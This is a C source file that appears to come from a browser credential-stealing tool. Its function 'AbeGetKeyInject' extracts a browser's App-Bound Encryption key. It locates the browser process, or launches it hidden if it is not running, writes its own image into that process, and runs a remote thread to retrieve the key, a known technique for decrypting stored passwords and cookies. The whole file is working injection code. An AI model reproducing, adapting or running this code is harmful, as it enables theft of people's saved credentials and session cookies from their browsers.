#include "AbeDecrypt.h"

static ULONG
AbeFindProcessIdByName(
    _In_ PCWSTR Name)
{
    UNICODE_STRING Target;
    PSYSTEM_PROCESS_INFORMATION Entry;
    PVOID Info;
    ULONG Pid = 0;

    RtlInitUnicodeString(&Target, Name);
    if (!NT_SUCCESS(Sys_QueryDynamicInfo(SystemProcessInformation, &Info)))
    {
        return 0;
    }
    Entry = Info;
    for (;;)
    {
        if (Entry->ImageName.Buffer != NULL &&
            RtlEqualUnicodeString(&Entry->ImageName, &Target, TRUE))
        {
            Pid = (ULONG)(ULONG_PTR)Entry->UniqueProcessId;
            break;
        }
        if (Entry->NextEntryOffset == 0)
        {
            break;
        }
        Entry = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)Entry + Entry->NextEntryOffset);
    }
    Sys_FreeInfo(Info);
    return Pid;
}

/*** method: Inject (target the running browser process, launch it if needed) ***/

_Success_(return != FALSE)
BOOL
AbeGetKeyInject(
    _In_ const NET_BROWSER_INFO* Browser,
    _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key)
{
    PVOID Self = (PVOID)&__ImageBase;
    PVOID Mapped = NULL;
    HANDLE Process = NULL, Thread = NULL;
    HANDLE LaunchedProcess = NULL;
    SIZE_T RegionSize = 0;
    LONG Code = (LONG)E_FAIL;
    ULONG Pid, Polls, LaunchedPid = 0;
    NTSTATUS Status;
    W32ERROR Error;
    ULONGLONG Step;
    BOOL Ok;

    Step = AbeStepStart();
    Ok = AbePrepareRequest(Browser);
    AbeLogStepBool(L"Inject", L"prepare request", Ok, Step);
    if (!Ok)
    {
        return FALSE;
    }

    Step = AbeStepStart();
    Pid = AbeFindProcessIdByName(Browser->ExeName);
    AbeLog(L"Inject: find running browser: %ls, pid=%lu (%I64ums)\r\n",
           Pid != 0 ? L"OK" : L"not found",
           Pid,
           AbeStepMs(Step));
    if (Pid == 0)
    {
        /* not running: launch it so we have a live process to inject into */
        PROCESS_INFORMATION Pi;

        Step = AbeStepStart();
        Ok = AbeCreateBrowserProcessEx(Browser->ExePath,
                                       L"--no-startup-window",
                                       0,
                                       SW_HIDE,
                                       &Pi);
        Error = Ok ? ERROR_SUCCESS : Err_GetLastError();
        AbeLogStepWin32(L"Inject", L"launch hidden browser", Error, Step);
        if (!Ok)
        {
            return FALSE;
        }
        LaunchedProcess = Pi.hProcess;
        LaunchedPid = Pi.dwProcessId;
        Pid = LaunchedPid;
        NtClose(Pi.hThread);
        Step = AbeStepStart();
        for (Polls = 0; Polls < 50; Polls++)
        {
            ULONG FoundPid = AbeFindProcessIdByName(Browser->ExeName);

            if (FoundPid != 0)
            {
                Pid = FoundPid;
                break;
            }
            PS_DelayExec(200);
        }
        AbeLog(L"Inject: locate launched browser: %ls, pid=%lu (%I64ums)\r\n",
               Pid != 0 ? L"OK" : L"failed",
               Pid,
               AbeStepMs(Step));
    }
    if (Pid == 0)
    {
        AbeLog(L"Inject: no running %ls found\r\n", Browser->ExeName);
        return FALSE;
    }
    Step = AbeStepStart();
    Status = PS_OpenProcess(&Process,
                            PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                            PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                            PROCESS_VM_READ,
                            Pid);
    AbeLogStepNt(L"Inject", L"open target process", Status, Step);
    if (!NT_SUCCESS(Status))
    {
        if (LaunchedProcess != NULL)
        {
            NtTerminateProcess(LaunchedProcess, 0);
            NtWaitForSingleObject(LaunchedProcess, FALSE, NULL);
            NtClose(LaunchedProcess);
        }
        return FALSE;
    }

    Step = AbeStepStart();
    Status = AbeMapSelf(Process, &Mapped);
    AbeLogStepNt(L"Inject", L"map payload image", Status, Step);
    if (NT_SUCCESS(Status))
    {
        Step = AbeStepStart();
        Status = PS_CreateThread(Process,
                                 FALSE,
                                 (PUSER_THREAD_START_ROUTINE)((PBYTE)Mapped +
                                     ((ULONG_PTR)AbeInjectEntry - (ULONG_PTR)Self)),
                                 NULL,
                                 &Thread,
                                 NULL);
        AbeLogStepNt(L"Inject", L"create remote thread", Status, Step);
        if (NT_SUCCESS(Status))
        {
            Step = AbeStepStart();
            Code = AbeWaitRemoteResult(Process, Thread, Mapped, Self, Key);
            AbeLogStepHr(L"Inject", L"wait payload result", (HRESULT)Code, Step);
        }
    }

    /* do NOT terminate the user's browser; the remote thread exits on its own */
    if (Thread != NULL)
    {
        NtClose(Thread);
    }
    if (Mapped != NULL)
    {
        NtFreeVirtualMemory(Process, &Mapped, &RegionSize, MEM_RELEASE);
    }
    if (LaunchedProcess != NULL)
    {
        if (Process != NULL)
        {
            Step = AbeStepStart();
            Status = NtTerminateProcess(Process, 0);
            AbeLogStepNt(L"Inject", L"terminate injected browser", Status, Step);
            NtWaitForSingleObject(Process, FALSE, NULL);
        }
        if (LaunchedPid != 0 && LaunchedPid != Pid)
        {
            Step = AbeStepStart();
            Status = NtTerminateProcess(LaunchedProcess, 0);
            AbeLogStepNt(L"Inject", L"terminate launcher process", Status, Step);
            NtWaitForSingleObject(LaunchedProcess, FALSE, NULL);
        }
        NtClose(LaunchedProcess);
    }
    if (Process != NULL)
    {
        NtClose(Process);
    }
    return Code == 0;
}
